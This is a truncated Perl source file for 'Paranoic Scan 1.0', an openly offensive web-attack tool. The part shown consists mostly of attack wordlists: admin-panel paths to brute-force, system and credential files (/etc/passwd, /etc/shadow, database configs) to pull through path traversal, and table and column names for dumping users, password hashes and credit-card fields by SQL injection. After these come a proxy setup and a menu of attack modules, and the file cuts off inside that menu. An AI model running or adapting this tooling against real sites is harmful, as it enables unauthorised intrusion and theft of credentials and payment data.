#!usr/bin/perl
#Paranoic Scan 1.0
#Coded By Doddy H
#Necessary modules
#http://search.cpan.org/~animator/Color-Output-1.05/Output.pm
#The arrays are a collection of several I found on the web

#Modules

use Digest::MD5 qw(md5_hex);
use Color::Output;
Color::Output::Init;

use LWP::UserAgent;
use IO::Socket;
use URI::Split qw(uri_split);
use HTML::LinkExtor;
use File::Basename;
use HTML::Form;
use URI::Escape;

##

##Arrays

my @paneles = (
    'admin/admin.asp',               'admin/login.asp',
    'admin/index.asp',               'admin/admin.aspx',
    'admin/login.aspx',              'admin/index.aspx',
    'admin/webmaster.asp',           'admin/webmaster.aspx',
    'asp/admin/index.asp',           'asp/admin/index.aspx',
    'asp/admin/admin.asp',           'asp/admin/admin.aspx',
    'asp/admin/webmaster.asp',       'asp/admin/webmaster.aspx',
    'admin/',                        'login.asp',
    'login.aspx',                    'admin.asp',
    'admin.aspx',                    'webmaster.aspx',
    'webmaster.asp',                 'login/index.asp',
    'login/index.aspx',              'login/login.asp',
    'login/login.aspx',              'login/admin.asp',
    'login/admin.aspx',              'administracion/index.asp',
    'administracion/index.aspx',     'administracion/login.asp',
    'administracion/login.aspx',     'administracion/webmaster.asp',
    'administracion/webmaster.aspx', 'administracion/admin.asp',
    'administracion/admin.aspx',     'php/admin/',
    'admin/admin.php',               'admin/index.php',
    'admin/login.php',               'admin/system.php',
    'admin/ingresar.php',            'admin/administrador.php',
    'admin/default.php',             'administracion/',
    'administracion/index.php',      'administracion/login.php',
    'administracion/ingresar.php',   'administracion/admin.php',
    'administration/',               'administration/index.php',
    'administration/login.php',      'administrator/index.php',
    'administrator/login.php',       'administrator/system.php',
    'system/',                       'system/login.php',
    'admin.php',                     'login.php',
    'administrador.php',             'administration.php',
    'administrator.php',             'admin1.html',
    'admin1.php',                    'admin2.php',
    'admin2.html',                   'yonetim.php',
    'yonetim.html',                  'yonetici.php',
    'yonetici.html',                 'adm/',
    'admin/account.php',             'admin/account.html',
    'admin/index.html',              'admin/login.html',
    'admin/home.php',                'admin/controlpanel.html',
    'admin/controlpanel.php',        'admin.html',
    'admin/cp.php',                  'admin/cp.html',
    'cp.php',                        'cp.html',
    'administrator/',                'administrator/index.html',
    'administrator/login.html',      'administrator/account.html',
    'administrator/account.php',     'administrator.html',
    'login.html',                    'modelsearch/login.php',
    'moderator.php',                 'moderator.html',
    'moderator/login.php',           'moderator/login.html',
    'moderator/admin.php',           'moderator/admin.html',
    'moderator/',                    'account.php',
    'account.html',                  'controlpanel/',
    'controlpanel.php',              'controlpanel.html',
    'admincontrol.php',              'admincontrol.html',
    'adminpanel.php',                'adminpanel.html',
    'admin1.asp',                    'admin2.asp',
    'yonetim.asp',                   'yonetici.asp',
    'admin/account.asp',             'admin/home.asp',
    'admin/controlpanel.asp',        'admin/cp.asp',
    'cp.asp',                        'administrator/index.asp',
    'administrator/login.asp',       'administrator/account.asp',
    'administrator.asp',             'modelsearch/login.asp',
    'moderator.asp',                 'moderator/login.asp',
    'moderator/admin.asp',           'account.asp',
    'controlpanel.asp',              'admincontrol.asp',
    'adminpanel.asp',                'fileadmin/',
    'fileadmin.php',                 'fileadmin.asp',
    'fileadmin.html',                'administration.html',
    'sysadmin.php',                  'sysadmin.html',
    'phpmyadmin/',                   'myadmin/',
    'sysadmin.asp',                  'sysadmin/',
    'ur-admin.asp',                  'ur-admin.php',
    'ur-admin.html',                 'ur-admin/',
    'Server.php',                    'Server.html',
    'Server.asp',                    'Server/',
    'wp-admin/',                     'administr8.php',
    'administr8.html',               'administr8/',
    'administr8.asp',                'webadmin/',
    'webadmin.php',                  'webadmin.asp',
    'webadmin.html',                 'administratie/',
    'admins/',                       'admins.php',
    'admins.asp',                    'admins.html',
    'administrivia/',                'Database_Administration/',
    'WebAdmin/',                     'useradmin/',
    'sysadmins/',                    'admin1/',
    'system-administration/',        'administrators/',
    'pgadmin/',                      'directadmin/',
    'staradmin/',                    'ServerAdministrator/',
    'SysAdmin/',                     'administer/',
    'LiveUser_Admin/',               'sys-admin/',
    'typo3/',                        'panel/',
    'cpanel/',                       'cPanel/',
    'cpanel_file/',                  'platz_login/',
    'rcLogin/',                      'blogindex/',
    'formslogin/',                   'autologin/',
    'support_login/',                'meta_login/',
    'manuallogin/',                  'simpleLogin/',
    'loginflat/',                    'utility_login/',
    'showlogin/',                    'memlogin/',
    'members/',                      'login-redirect/',
    'sub-login/',                    'wp-login/',
    'login1/',                       'dir-login/',
    'login_db/',                     'xlogin/',
    'smblogin/',                     'customer_login/',
    'UserLogin/',                    'login-us/',
    'acct_login/',                   'admin_area/',
    'bigadmin/',                     'project-admins/',
    'phppgadmin/',                   'pureadmin/',
    'sql-admin/',                    'radmind/',
    'openvpnadmin/',                 'wizmysqladmin/',
    'vadmind/',                      'ezsqliteadmin/',
    'hpwebjetadmin/',                'newsadmin/',
    'adminpro/',                     'Lotus_Domino_Admin/',
    'bbadmin/',                      'vmailadmin/',
    'Indy_admin/',                   'ccp14admin/',
    'irc-macadmin/',                 'banneradmin/',
    'sshadmin/',                     'phpldapadmin/',
    'macadmin/',                     'administratoraccounts/',
    'admin4_account/',               'admin4_colon/',
    'radmind-1/',                    'Super-Admin/',
    'AdminTools/',                   'cmsadmin/',
    'SysAdmin2/',                    'globes_admin/',
    'cadmins/',                      'phpSQLiteAdmin/',
    'navSiteAdmin/',                 'server_admin_small/',
    'logo_sysadmin/',                'server/',
    'database_administration/',      'power_user/',
    'system_administration/',        'ss_vms_admin_sm/'
);

my @files = (
    'C:/xampp/htdocs/aca.txt',
    'C:/xampp/htdocs/aca.txt',
    'C:/xampp/htdocs/admin.php',
    'C:/xampp/htdocs/leer.txt',
    '../../../boot.ini',
    '../../../../boot.ini',
    '../../../../../boot.ini',
    '../../../../../../boot.ini',
    '/etc/passwd',
    '/etc/shadow',
    '/etc/shadow~',
    '/etc/hosts',
    '/etc/motd',
    '/etc/apache/apache.conf',
    '/etc/fstab',
    '/etc/apache2/apache2.conf',
    '/etc/apache/httpd.conf',
    '/etc/httpd/conf/httpd.conf',
    '/etc/apache2/httpd.conf',
    '/etc/apache2/sites-available/default',
    '/etc/mysql/my.cnf',
    '/etc/my.cnf',
    '/etc/sysconfig/network-scripts/ifcfg-eth0',
    '/etc/redhat-release',
    '/etc/httpd/conf.d/php.conf',
    '/etc/pam.d/proftpd',
    '/etc/phpmyadmin/config.inc.php',
    '/var/www/config.php',
    '/etc/httpd/logs/error_log',
    '/etc/httpd/logs/error.log',
    '/etc/httpd/logs/access_log',
    '/etc/httpd/logs/access.log',
    '/var/log/apache/error_log',
    '/var/log/apache/error.log',
    '/var/log/apache/access_log',
    '/var/log/apache/access.log',
    '/var/log/apache2/error_log',
    '/var/log/apache2/error.log',
    '/var/log/apache2/access_log',
    '/var/log/apache2/access.log',
    '/var/www/logs/error_log',
    '/var/www/logs/error.log',
    '/var/www/logs/access_log',
    '/var/www/logs/access.log',
    '/usr/local/apache/logs/error_log',
    '/usr/local/apache/logs/error.log',
    '/usr/local/apache/logs/access_log',
    '/usr/local/apache/logs/access.log',
    '/var/log/error_log',
    '/var/log/error.log',
    '/var/log/access_log',
    '/var/log/access.log',
    '/etc/group',
    '/etc/security/group',
    '/etc/security/passwd',
    '/etc/security/user',
    '/etc/security/environ',
    '/etc/security/limits',
    '/usr/lib/security/mkuser.default',
    '/apache/logs/access.log',
    '/apache/logs/error.log',
    '/etc/httpd/logs/acces_log',
    '/etc/httpd/logs/acces.log',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/apache2/logs/error.log',
    '/apache2/logs/access.log',
    '/logs/error.log',
    '/logs/access.log',
    '/usr/local/apache2/logs/access_log',
    '/usr/local/apache2/logs/access.log',
    '/usr/local/apache2/logs/error_log',
    '/usr/local/apache2/logs/error.log',
    '/var/log/httpd/access.log',
    '/var/log/httpd/error.log',
    '/opt/lampp/logs/access_log',
    '/opt/lampp/logs/error_log',
    '/opt/xampp/logs/access_log',
    '/opt/xampp/logs/error_log',
    '/opt/lampp/logs/access.log',
    '/opt/lampp/logs/error.log',
    '/opt/xampp/logs/access.log',
    '/opt/xampp/logs/error.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\access.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\error.log',
    '/usr/local/apache/conf/httpd.conf',
    '/usr/local/apache2/conf/httpd.conf',
    '/etc/apache/conf/httpd.conf',
    '/usr/local/etc/apache/conf/httpd.conf',
    '/usr/local/apache/httpd.conf',
    '/usr/local/apache2/httpd.conf',
    '/usr/local/httpd/conf/httpd.conf',
    '/usr/local/etc/apache2/conf/httpd.conf',
    '/usr/local/etc/httpd/conf/httpd.conf',
    '/usr/apache2/conf/httpd.conf',
    '/usr/apache/conf/httpd.conf',
    '/usr/local/apps/apache2/conf/httpd.conf',
    '/usr/local/apps/apache/conf/httpd.conf',
    '/etc/apache2/conf/httpd.conf',
    '/etc/http/conf/httpd.conf',
    '/etc/httpd/httpd.conf',
    '/etc/http/httpd.conf',
    '/etc/httpd.conf',
    '/opt/apache/conf/httpd.conf',
    '/opt/apache2/conf/httpd.conf',
    '/var/www/conf/httpd.conf',
    '/private/etc/httpd/httpd.conf',
    '/private/etc/httpd/httpd.conf.default',
    '/Volumes/webBackup/opt/apache2/conf/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
    'C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf',
    'C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf',
    'C:\ProgramFiles\xampp\apache\conf\httpd.conf',
    '/usr/local/php/httpd.conf.php',
    '/usr/local/php4/httpd.conf.php',
    '/usr/local/php5/httpd.conf.php',
    '/usr/local/php/httpd.conf',
    '/usr/local/php4/httpd.conf',
    '/usr/local/php5/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
    '/usr/local/etc/apache/vhosts.conf',
    '/etc/php.ini',
    '/bin/php.ini',
    '/etc/httpd/php.ini',
    '/usr/lib/php.ini',
    '/usr/lib/php/php.ini',
    '/usr/local/etc/php.ini',
    '/usr/local/lib/php.ini',
    '/usr/local/php/lib/php.ini',
    '/usr/local/php4/lib/php.ini',
    '/usr/local/php5/lib/php.ini',
    '/usr/local/apache/conf/php.ini',
    '/etc/php4.4/fcgi/php.ini',
    '/etc/php4/apache/php.ini',
    '/etc/php4/apache2/php.ini',
    '/etc/php5/apache/php.ini',
    '/etc/php5/apache2/php.ini',
    '/etc/php/php.ini',
    '/etc/php/php4/php.ini',
    '/etc/php/apache/php.ini',
    '/etc/php/apache2/php.ini',
    '/web/conf/php.ini',
    '/usr/local/Zend/etc/php.ini',
    '/opt/xampp/etc/php.ini',
    '/var/local/www/conf/php.ini',
    '/etc/php/cgi/php.ini',
    '/etc/php4/cgi/php.ini',
    '/etc/php5/cgi/php.ini',
    'c:\php5\php.ini',
    'c:\php4\php.ini',
    'c:\php\php.ini',
    'c:\PHP\php.ini',
    'c:\WINDOWS\php.ini',
    'c:\WINNT\php.ini',
    'c:\apache\php\php.ini',
    'c:\xampp\apache\bin\php.ini',
    'c:\NetServer\bin\stable\apache\php.ini',
    'c:\home2\bin\stable\apache\php.ini',
    'c:\home\bin\stable\apache\php.ini',
    '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
    '/usr/local/cpanel/logs',
    '/usr/local/cpanel/logs/stats_log',
    '/usr/local/cpanel/logs/access_log',
    '/usr/local/cpanel/logs/error_log',
    '/usr/local/cpanel/logs/license_log',
    '/usr/local/cpanel/logs/login_log',
    '/var/cpanel/cpanel.config',
    '/var/log/mysql/mysql-bin.log',
    '/var/log/mysql.log',
    '/var/log/mysqlderror.log',
    '/var/log/mysql/mysql.log',
    '/var/log/mysql/mysql-slow.log',
    '/var/mysql.log',
    '/var/lib/mysql/my.cnf',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\data\hostname.err',
    'C:\ProgramFiles\MySQL\data\mysql.log',
    'C:\ProgramFiles\MySQL\data\mysql.err',
    'C:\ProgramFiles\MySQL\data\mysql-bin.log',
    'C:\MySQL\data\hostname.err',
    'C:\MySQL\data\mysql.log',
    'C:\MySQL\data\mysql.err',
    'C:\MySQL\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf',
    'C:\ProgramFiles\MySQL\my.ini',
    'C:\ProgramFiles\MySQL\my.cnf',
    'C:\MySQL\my.ini',
    'C:\MySQL\my.cnf',
    '/etc/logrotate.d/proftpd',
    '/www/logs/proftpd.system.log',
    '/var/log/proftpd',
    '/etc/proftp.conf',
    '/etc/protpd/proftpd.conf',
    '/etc/vhcs2/proftpd/proftpd.conf',
    '/etc/proftpd/modules.conf',
    '/var/log/vsftpd.log',
    '/etc/vsftpd.chroot_list',
    '/etc/logrotate.d/vsftpd.log',
    '/etc/vsftpd/vsftpd.conf',
    '/etc/vsftpd.conf',
    '/etc/chrootUsers',
    '/var/log/xferlog',
    '/var/adm/log/xferlog',
    '/etc/wu-ftpd/ftpaccess',
    '/etc/wu-ftpd/ftphosts',
    '/etc/wu-ftpd/ftpusers',
    '/usr/sbin/pure-config.pl',
    '/usr/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.conf',
    '/usr/local/etc/pure-ftpd.conf',
    '/usr/local/etc/pureftpd.pdb',
    '/usr/local/pureftpd/etc/pureftpd.pdb',
    '/usr/local/pureftpd/sbin/pure-config.pl',
    '/usr/local/pureftpd/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.pdb',
    '/etc/pureftpd.pdb',
    '/etc/pureftpd.passwd',
    '/etc/pure-ftpd/pureftpd.pdb',
    '/var/log/pure-ftpd/pure-ftpd.log',
    '/logs/pure-ftpd.log',
    '/var/log/pureftpd.log',
    '/var/log/ftp-proxy/ftp-proxy.log',
    '/var/log/ftp-proxy',
    '/var/log/ftplog',
    '/etc/logrotate.d/ftp',
    '/etc/ftpchroot',
    '/etc/ftphosts',
    '/var/log/exim_mainlog',
    '/var/log/exim/mainlog',
    '/var/log/maillog',
    '/var/log/exim_paniclog',
    '/var/log/exim/paniclog',
    '/var/log/exim/rejectlog',
    '/var/log/exim_rejectlog'
);
my @buscar1 = (
    'usuario',                 'web_users',
    'name',                    'names',
    'nombre',                  'nombres',
    'usuarios',                'member',
    'members',                 'admin_table',
    'usuaris',                 'admin',
    'tblUsers',                'tblAdmin',
    'user',                    'users',
    'username',                'usernames',
    'web_usuarios',            'miembro',
    'miembros',                'membername',
    'admins',                  'administrator',
    'sign',                    'config',
    'USUARIS',                 'cms_operadores',
    'administrators',          'passwd',
    'password',                'passwords',
    'pass',                    'Pass',
    'mpn_authors',             'author',
    'musuario',                'mysql.user',
    'user_names',              'foro',
    'tAdmin',                  'tadmin',
    'user_password',           'user_passwords',
    'user_name',               'member_password',
    'mods',                    'mod',
    'moderators',              'moderator',
    'user_email',              'jos_users',
    'mb_user',                 'host',
    'apellido_nombre',         'user_emails',
    'user_mail',               'user_mails',
    'mail',                    'emails',
    'email',                   'address',
    'jos_usuarios',            'tutorial_user_auth',
    'e-mail',                  'emailaddress',
    'correo',                  'correos',
    'phpbb_users',             'log',
    'logins',                  'login',
    'tbl_usuarios',            'user_auth',
    'login_radio',             'registers',
    'register',                'usr',
    'usrs',                    'ps',
    'pw',                      'un',
    'u_name',                  'u_pass',
    'tbl_admin',               'usuarios_head',
    'tpassword',               'tPassword',
    'u_password',              'nick',
    'nicks',                   'manager',
    'managers',                'administrador',
    'BG_CMS_Users',            'tUser',
    'tUsers',                  'administradores',
    'clave',                   'login_id',
    'pwd',                     'pas',
    'sistema_id',              'foro_usuarios',
    'cliente',                 'sistema_usuario',
    'sistema_password',        'contrasena',
    'auth',                    'key',
    'senha',                   'signin',
    'dir_admin',               'alias',
    'clientes',                'tb_admin',
    'tb_administrator',        'tb_login',
    'tb_logon',                'tb_members_tb_member',
    'calendar_users',          'cursos',
    'tb_users',                'tb_user',
    'tb_sys',                  'sys',
    'fazerlogon',              'logon',
    'fazer',                   'authorization',
    'curso',                   'membros',
    'utilizadores',            'staff',
    'nuke_authors',            'accounts',
    'account',                 'accnts',
    'signup',                  'leads',
    'lead',                    'associated',
    'accnt',                   'customers',
    'customer',                'membres',
    'administrateur',          'utilisateur',
    'riacms_users',            'tuser',
    'tusers',                  'utilisateurs',
    'amministratore',          'god',
    'God',                     'authors',
    'wp_users',                'tb_usuarios',
    'asociado',                'asociados',
    'autores',                 'autor',
    'Users',                   'Admin',
    'Members',                 'tb_usuario',
    'Miembros',                'Usuario',
    'Usuarios',                'ADMIN',
    'USERS',                   'USER',
    'MEMBER',                  'MEMBERS',
    'USUARIO',                 'USUARIOS',
    'MIEMBROS',                'MIEMBRO',
    'USR_NAME',                'about',
    'access',                  'admin_id',
    'admin_name',              'admin_pass',
    'admin_passwd',            'admin_password',
    'admin_pwd',               'admin_user',
    'admin_userid',            'admin_username',
    'adminemail',              'adminid',
    'administrator_name',      'adminlogin',
    'adminmail',               'adminname',
    'adminuser',               'adminuserid',
    'adminusername',           'aid',
    'aim',                     'apwd',
    'auid',                    'authenticate',
    'authentication',          'blog',
    'cc_expires',              'cc_number',
    'cc_owner',                'cc_type',
    'cfg',                     'cid',
    'clientname',              'clientpassword',
    'clientusername',          'conf',
    'contact',                 'converge_pass_hash',
    'converge_pass_salt',      'crack',
    'customers_email_address', 'customers_password',
    'cvvnumber]',              'data',
    'db_database_name',        'db_hostname',
    'db_password',             'db_username',
    'download',                'e_mail',
    'emer',                    'emni',
    'emniplote',               'emri',
    'fjalekalimi',             'fjalekalimin',
    'full',                    'gid',
    'group',                   'group_name',
    'hash',                    'hashsalt',
    'homepage',                'icq',
    'icq_number',              'id',
    'id_group',                'id_member',
    'images',                  'ime',
    'index',                   'ip_address',
    'kodi',                    'korisnici',
    'korisnik',                'kpro_user',
    'last_ip',                 'last_login',
    'lastname',                'llogaria',
    'login_admin',             'login_name',
    'login_pass',              'login_passwd',
    'login_password',          'login_pw',
    'login_pwd',               'login_user',
    'login_username',          'logini',
    'loginkey',                'loginout',
    'logo',                    'logohu',
    'lozinka',                 'md5hash',
    'mem_login',               'mem_pass',
    'mem_passwd',              'mem_password',
    'mem_pwd',                 'member_id',
    'member_login_key',        'member_name',
    'memberid',                'memlogin',
    'mempassword',             'my_email',
    'my_name',                 'my_password',
    'my_username',             'myname',
    'mypassword',              'myusername',
    'nc',                      'new',
    'news',                    'number',
    'nummer',                  'p_assword',
    'p_word',                  'pass_hash',
    'pass_w',                  'pass_word',
    'pass1word',               'passw',
    'passwordsalt',            'passwort',
    'passwrd',                 'perdorimi',
    'perdoruesi',              'personal_key',
    'phone',                   'privacy',
    'psw',                     'punetoret',
    'punonjes',                'pword',
    'pwrd',                    'salt',
    'search',                  'secretanswer',
    'secretquestion',          'serial',
    'session_member_id',       'session_member_login_key',
    'sesskey',                 'setting',
    'sid',                     'sifra',
    'spacer',                  'status',
    'store',                   'store1',
    'store2',                  'store3',
    'store4',                  'table_prefix',
    'temp_pass',               'temp_password',
    'temppass',                'temppasword',
    'text',                    'uid',
    'uname',                   'user_admin',
    'user_icq',                'user_id',
    'user_ip',                 'user_level',
    'user_login',              'user_n',
    'user_pass',               'user_passw',
    'user_passwd',             'user_pw',
    'user_pwd',                'user_pword',
    'user_pwrd',               'user_un',
    'user_uname',              'user_username',
    'user_usernm',             'user_usernun',
    'user_usrnm',              'user1',
    'useradmin',               'userid',
    'userip',                  'userlogin',
    'usern',                   'usernm',
    'userpass',                'userpassword',
    'userpw',                  'userpwd',
    'usr_n',                   'usr_name',
    'usr_pass',                'usr2',
    'usrn',                    'usrnam',
    'usrname',                 'usrnm',
    'usrpass',                 'warez',
    'xar_name',                'xar_pass',
    'nom dutilisateur',        'mot de passe',
    'compte',                  'comptes',
    'aide',                    'objectif',
    'authentifier',            'authentification',
    'Contact',                 'fissure',
    'client',                  'clients',
    'de donn?es',              'mot_de_passe_bdd',
    't?l?charger',             'E-mail',
    'adresse e-mail',          'Emer',
    'complet',                 'groupe',
    'hachage',                 'Page daccueil',
    'Kodi',                    'nom',
    'connexion',               'membre',
    'MEMBERNAME',              'mon_mot_de_passe',
    'monmotdepasse',           'ignatiusj',
    'caroline-du-nord',        'nouveau',
    'Nick',                    'passer',
    'Passw',                   'Mot de passe',
    't?l?phone',               'protection de la vie priv?e',
    'PSW',                     'pWord',
    'sel',                     'recherche',
    'de s?rie',                'param?tre',
    '?tat',                    'stocker',
    'texte',                   'cvvnumber'
);
my @buscar2 = (
    'name',                          'user',
    'user_name',                     'user_username',
    'uname',                         'user_uname',
    'usern',                         'user_usern',
    'un',                            'user_un',
    'mail',                          'cliente',
    'usrnm',                         'user_usrnm',
    'usr',                           'admin_name',
    'cla_adm',                       'usu_adm',
    'fazer',                         'logon',
    'fazerlogon',                    'authorization',
    'membros',                       'utilizadores',
    'sysadmin',                      'email',
    'senha',                         'username',
    'usernm',                        'user_usernm',
    'nm',                            'user_nm',
    'login',                         'u_name',
    'nombre',                        'host',
    'pws',                           'cedula',
    'userName',                      'host_password',
    'chave',                         'alias',
    'apellido_nombre',               'cliente_nombre',
    'cliente_email',                 'cliente_pass',
    'cliente_user',                  'cliente_usuario',
    'login_id',                      'sistema_id',
    'author',                        'user_login',
    'admin_user',                    'admin_pass',
    'uh_usuario',                    'uh_password',
    'psw',                           'host_username',
    'sistema_usuario',               'auth',
    'key',                           'usuarios_nombre',
    'usuarios_nick',                 'usuarios_password',
    'user_clave',                    'membername',
    'nme',                           'unme',
    'password',                      'user_password',
    'autores',                       'pass_hash',
    'hash',                          'pass',
    'correo',                        'usuario_nombre',
    'usuario_nick',                  'usuario_password',
    'userpass',                      'user_pass',
    'upw',                           'pword',
    'user_pword',                    'passwd',
    'user_passwd',                   'passw',
    'user_passw',                    'pwrd',
    'user_pwrd',                     'pwd',
    'authors',                       'user_pwd',
    'u_pass',                        'clave',
    'usuario',                       'contrasena',
    'pas',                           'sistema_password',
    'autor',                         'upassword',
    'web_password',                  'web_username',
    'tbladmins',                     'sort',
    '_wfspro_admin',                 '4images_users',
    'a_admin',                       'account',
    'accounts',                      'adm',
    'admin',                         'admin_login',
    'admin_userinfo',                'administer',
    'administrable',                 'administrate',
    'administration',                'administrator',
    'administrators',                'adminrights',
    'admins',                        'adminuser',
    'art',                           'article_admin',
    'articles',                      'artikel',
    'ÃÜÂë',                          'aut',
    'autore',                        'backend',
    'backend_users',                 'backenduser',
    'bbs',                           'book',
    'chat_config',                   'chat_messages',
    'chat_users',                    'client',
    'clients',                       'clubconfig',
    'company',                       'config',
    'contact',                       'contacts',
    'content',                       'control',
    'cpg_config',                    'cpg132_users',
    'customer',                      'customers',
    'customers_basket',              'dbadmins',
    'dealer',                        'dealers',
    'diary',                         'download',
    'Dragon_users',                  'e107.e107_user',
    'e107_user',                     'forum.ibf_members',
    'fusion_user_groups',            'fusion_users',
    'group',                         'groups',
    'ibf_admin_sessions',            'ibf_conf_settings',
    'ibf_members',                   'ibf_members_converge',
    'ibf_sessions',                  'icq',
    'images',                        'index',
    'info',                          'ipb.ibf_members',
    'ipb_sessions',                  'joomla_users',
    'jos_blastchatc_users',          'jos_comprofiler_members',
    'jos_contact_details',           'jos_joomblog_users',
    'jos_messages_cfg',              'jos_moschat_users',
    'jos_users',                     'knews_lostpass',
    'korisnici',                     'kpro_adminlogs',
    'kpro_user',                     'links',
    'login_admin',                   'login_admins',
    'login_user',                    'login_users',
    'logins',                        'logs',
    'lost_pass',                     'lost_passwords',
    'lostpass',                      'lostpasswords',
    'm_admin',                       'main',
    'mambo_session',                 'mambo_users',
    'manage',                        'manager',
    'mb_users',                      'member',
    'memberlist',                    'members',
    'minibbtable_users',             'mitglieder',
    'movie',                         'movies',
    'mybb_users',                    'mysql',
    'mysql.user',                    'names',
    'news',                          'news_lostpass',
    'newsletter',                    'nuke_authors',
    'nuke_bbconfig',                 'nuke_config',
    'nuke_popsettings',              'nuke_users',
    'ÓÃ»§',                          'obb_profiles',
    'order',                         'orders',
    'parol',                         'partner',
    'partners',                      'passes',
    'passwords',                     'perdorues',
    'perdoruesit',                   'phorum_session',
    'phorum_user',                   'phorum_users',
    'phpads_clients',                'phpads_config',
    'phpbb_users',                   'phpBB2.forum_users',
    'phpBB2.phpbb_users',            'phpmyadmin.pma_table_info',
    'pma_table_info',                'poll_user',
    'punbb_users',                   'pwds',
    'reg_user',                      'reg_users',
    'registered',                    'reguser',
    'regusers',                      'session',
    'sessions',                      'settings',
    'shop.cards',                    'shop.orders',
    'site_login',                    'site_logins',
    'sitelogin',                     'sitelogins',
    'sites',                         'smallnuke_members',
    'smf_members',                   'SS_orders',
    'statistics',                    'superuser',
    'sysadmins',                     'system',
    'sysuser',                       'sysusers',
    'table',                         'tables',
    'tb_admin',                      'tb_administrator',
    'tb_login',                      'tb_member',
    'tb_members',                    'tb_user',
    'tb_username',                   'tb_usernames',
    'tb_users',                      'tbl',
    'tbl_user',                      'tbl_users',
    'tbluser',                       'tbl_clients',
    'tbl_client',                    'tblclients',
    'tblclient',                     'test',
    'usebb_members',                 'user_admin',
    'user_info',                     'user_list',
    'user_logins',                   'user_names',
    'usercontrol',                   'userinfo',
    'userlist',                      'userlogins',
    'usernames',                     'userrights',
    'users',                         'vb_user',
    'vbulletin_session',             'vbulletin_user',
    'voodoo_members',                'webadmin',
    'webadmins',                     'webmaster',
    'webmasters',                    'webuser',
    'webusers',                      'x_admin',
    'xar_roles',                     'xoops_bannerclient',
    'xoops_users',                   'yabb_settings',
    'yabbse_settings',               'ACT_INFO',
    'ActiveDataFeed',                'Category',
    'CategoryGroup',                 'ChicksPass',
    'ClickTrack',                    'Country',
    'CountryCodes1',                 'CustomNav',
    'DataFeedPerformance1',          'DataFeedPerformance2',
    'DataFeedPerformance2_incoming', 'DataFeedShowtag1',
    'DataFeedShowtag2',              'DataFeedShowtag2_incoming',
    'dtproperties',                  'Event',
    'Event_backup',                  'Event_Category',
    'EventRedirect',                 'Events_new',
    'Genre',                         'JamPass',
    'MyTicketek',                    'MyTicketekArchive',
    'News',                          'PerfPassword',
    'PerfPasswordAllSelected',       'Promotion',
    'ProxyDataFeedPerformance',      'ProxyDataFeedShowtag',
    'ProxyPriceInfo',                'Region',
    'SearchOptions',                 'Series',
    'Sheldonshows',                  'StateList',
    'States',                        'SubCategory',
    'Subjects',                      'Survey',
    'SurveyAnswer',                  'SurveyAnswerOpen',
    'SurveyQuestion',                'SurveyRespondent',
    'sysconstraints',                'syssegments',
    'tblRestrictedPasswords',        'tblRestrictedShows',
    'TimeDiff',                      'Titles',
    'ToPacmail1',                    'ToPacmail2',
    'UserPreferences',               'uvw_Category',
    'uvw_Pref',                      'uvw_Preferences',
    'Venue',                         'venues',
    'VenuesNew',                     'X_3945',
    'tblArtistCategory',             'tblArtists',
    'tblConfigs',                    'tblLayouts',
    'tblLogBookAuthor',              'tblLogBookEntry',
    'tblLogBookImages',              'tblLogBookImport',
    'tblLogBookUser',                'tblMails',
    'tblNewCategory',                'tblNews',
    'tblOrders',                     'tblStoneCategory',
    'tblStones',                     'tblUser',
    'tblWishList',                   'VIEW1',
    'viewLogBookEntry',              'viewStoneArtist',
    'vwListAllAvailable',            'CC_info',
    'CC_username',                   'cms_user',
    'cms_users',                     'cms_admin',
    'cms_admins',                    'jos_user',
    'table_user',                    'bulletin',
    'cc_info',                       'login_name',
    'admuserinfo',                   'userlistuser_list',
    'SiteLogin',                     'Site_Login',
    'UserAdmin',                     'Admins',
    'Login',                         'Logins'
);

##

my $nave = LWP::UserAgent->new;
$nave->agent(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
);
$nave->timeout(10);

##Test Proxy

my $now_proxy;
my $te = getdatanownownownow();

if ( $te =~ /proxy=(.*)/ ) {
    $now_proxy = $1;
    $nave->proxy( "http", "http://" . $now_proxy );
}

##

#Inicio

inicio_total();

sub inicio_total {

    head_menu();

    unless ( -f "data.txt" ) {
        instalar();
    }
    else {

        #Start the menu
        my $re = menu_login();
        printear( "\n\n\t\t\t[+] Checking ...\n", "text", "7", "5" );
        sleep(3);
        if ( $re eq "yes" ) {
            estoydentro();
        }
        else {
            printear( "\n\n\t\t\t[-] Bad Login\n\n\n", "text", "5", "5" );
            <stdin>;
            inicio_total();
        }
    }
    copyright_menu();
}

#Final

sub estoydentro {
    head_menu();
    menu_central();
    my $op = printear( "\n\n\t\t\t[+] Option : ", "stdin", "11", "13" );
    $SIG{INT} = \&estoydentroporahora; ## Comment on this line to compile to exe
    if ( $op eq "1" ) {
        load_paranoic_old();
    }
    elsif ( $op eq "2" ) {
        load_kobra();
    }
    elsif ( $op eq "3" ) {
        load_bypass();
    }
    elsif ( $op eq "4" ) {
        load_fsd();
    }
    elsif ( $op eq "5" ) {
        load_findpaths();
    }
    elsif ( $op eq "6" ) {
        load_locateip();
    }
    elsif ( $op eq "7" ) {
